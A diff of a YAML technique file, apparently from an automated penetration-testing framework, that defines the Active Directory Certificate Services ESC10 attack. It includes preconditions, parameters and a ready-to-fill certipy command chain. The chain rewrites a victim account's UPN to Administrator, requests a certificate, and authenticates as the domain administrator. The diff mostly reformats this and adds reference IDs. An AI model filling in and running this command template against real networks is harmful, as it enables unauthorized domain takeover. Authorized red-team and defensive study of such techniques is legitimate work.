@@ -1,6 +1,6 @@
 name: adcs_esc10
 category: ad
-description: ADCS ESC10 — weak Kerberos cert mapping (StrongCertificateBindingEnforcement)
+description: "ADCS ESC10 \u2014 weak Kerberos cert mapping (StrongCertificateBindingEnforcement)"
 preconditions:
 - has_cred
 - service.port==445
@@ -12,9 +12,8 @@ parameters:
   password: from_cred.password
   ca: from_engagement.ca
   victim: from_engagement.victim_user
-command_template: certipy account update -u {username}@{domain} -p '{password}' -user
-  '{victim}' -upn Administrator && certipy req -u '{victim}@{domain}' -p '{password}'
-  -ca '{ca}' -template User -dc-ip {target_ip} && certipy auth -pfx administrator.pfx
+command_template: certipy account update -u {username}@{domain} -p '{password}' -user '{victim}' -upn Administrator && certipy
+  req -u '{victim}@{domain}' -p '{password}' -ca '{ca}' -template User -dc-ip {target_ip} && certipy auth -pfx administrator.pfx
   -domain {domain}
 parser: generic_parser
 expected_effects:
@@ -29,11 +28,18 @@ mechanism: 'When DC registry StrongCertificateBindingEnforcement=0 (or Certifica
 
   allows UPN), Kerberos maps cert to principal by UPN alone. Same mechanic as ESC9
 
-  but triggered by DC-side config rather than template flag. May be default pre-May
-  2022.
+  but triggered by DC-side config rather than template flag. May be default pre-May 2022.
 
   '
 references:
   ocd_mindmap: 'Branch 7: ADCS ESC10 (weak cert mapping)'
   hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+  ocd_mindmap_node_ids:
+  - 07650d7a48
+  - 42fea85308
+  - 49bb4c7c69
+  - 8f48806198
+  - a8cd761989
+  - cfd9820356
+  - d8bc6299ef
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
